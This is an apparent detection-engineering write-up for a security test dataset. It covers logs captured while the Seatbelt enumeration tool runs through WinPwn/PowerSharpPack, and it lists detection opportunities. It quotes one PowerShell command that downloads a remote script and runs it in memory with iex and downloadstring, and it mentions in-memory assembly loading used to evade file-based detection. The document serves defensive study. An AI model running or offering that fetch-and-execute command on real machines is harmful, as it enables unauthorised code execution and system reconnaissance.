# T1082-23: System Information Discovery — WinPwn - PowerSharpPack - Seatbelt

## Technique Context

T1082 System Information Discovery encompasses adversary activities to gather information about the target system's configuration, hardware, software, and environment. This intelligence gathering helps attackers understand their operational environment, identify security controls, locate valuable data, and plan privilege escalation or lateral movement. The detection community focuses heavily on monitoring execution of system enumeration tools, PowerShell-based discovery scripts, and commands that query system properties, services, processes, and network configurations.

This specific test leverages Seatbelt, a popular C# enumeration tool from the PowerSharpPack collection, which performs comprehensive system discovery across multiple categories including OS information, user accounts, services, network configuration, installed software, and security settings. Seatbelt is frequently used by both penetration testers and real-world adversaries for post-exploitation reconnaissance.

## What This Dataset Contains

The dataset captures a PowerShell-based execution of Seatbelt through the WinPwn framework. The primary evidence comes from Security event logs showing process creation:

**Process Chain:**
- Parent PowerShell process (PID 44964) spawning child PowerShell (PID 20808) with command line: `"powershell.exe" & {$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1'); Invoke-Seatbelt -Command "\"-group=all\""}`

**Network Activity:**
Sysmon EID 22 captures DNS resolution for `raw.githubusercontent.com` (resolving to GitHub's CDN IP addresses), confirming the download of the Invoke-Seatbelt.ps1 script.

**PowerShell Telemetry:**
The PowerShell operational logs contain extensive script block logging showing:
- Download and execution of the Invoke-Seatbelt.ps1 wrapper
- A large base64-encoded .NET assembly being loaded in memory (the embedded Seatbelt binary)
- The assembly being decompressed and executed via .NET reflection

**Sysmon Events:**
Multiple EID 7 (Image Loaded) events show .NET runtime components being loaded, consistent with in-memory .NET assembly execution. EID 10 (Process Access) events indicate PowerShell accessing both whoami.exe and the child PowerShell process.

## What This Dataset Does Not Contain

The dataset lacks the actual system discovery output that Seatbelt would normally produce. While the tool downloaded and executed successfully (based on the .NET assembly loading and process access patterns), the comprehensive system enumeration results that make this technique valuable to adversaries are not visible in the captured telemetry.

Additionally, many potential Sysmon ProcessCreate events for discovery utilities that Seatbelt might spawn are not present, likely due to the sysmon-modular configuration's include-mode filtering that only captures known-suspicious process patterns. The technique's success appears complete from PowerShell's perspective, but the detailed enumeration artifacts are not preserved.

## Assessment

This dataset provides excellent coverage for detecting the initial stages of PowerShell-based system discovery tool deployment. The combination of command-line logging, PowerShell script block logging, and Sysmon telemetry creates multiple detection opportunities for the delivery mechanism. However, the dataset's utility is somewhat limited by the absence of the actual discovery output and potential gaps in process monitoring due to Sysmon filtering.

The PowerShell channel data is particularly valuable, showing both the download mechanism and the sophisticated in-memory .NET assembly execution technique commonly used to evade file-based detection. The presence of clear network indicators (GitHub download) and distinctive PowerShell patterns makes this dataset well-suited for developing behavioral detections.

## Detection Opportunities Present in This Data

1. **Suspicious PowerShell Network Downloads** - Monitor for PowerShell downloading scripts from GitHub, especially the S3cur3Th1sSh1t repository or PowerSharpPack project paths

2. **In-Memory .NET Assembly Execution** - Detect PowerShell script blocks containing base64-encoded assemblies being loaded via System.Reflection.Assembly::Load

3. **PowerShell Invoking Discovery Tools** - Alert on PowerShell command lines or script blocks containing references to "Seatbelt" or similar enumeration tools

4. **Compressed Payload Decompression** - Monitor for PowerShell using IO.Compression.GzipStream or similar decompression techniques combined with reflection-based execution

5. **Process Access from PowerShell** - Correlate Sysmon EID 10 events showing PowerShell accessing multiple other processes, potentially indicating enumeration activities

6. **DNS Queries for Tool Repositories** - Flag DNS requests to raw.githubusercontent.com or similar hosting sites from PowerShell processes, especially when followed by script execution

7. **PowerShell Profile Modifications** - Watch for creation or modification of PowerShell profile files in system profile directories, as seen with the StartupProfileData files

8. **Multiple .NET Runtime Loads** - Detect rapid loading of multiple .NET framework components (mscoreei.dll, clr.dll, clrjit.dll) within PowerShell processes as potential indicator of assembly execution
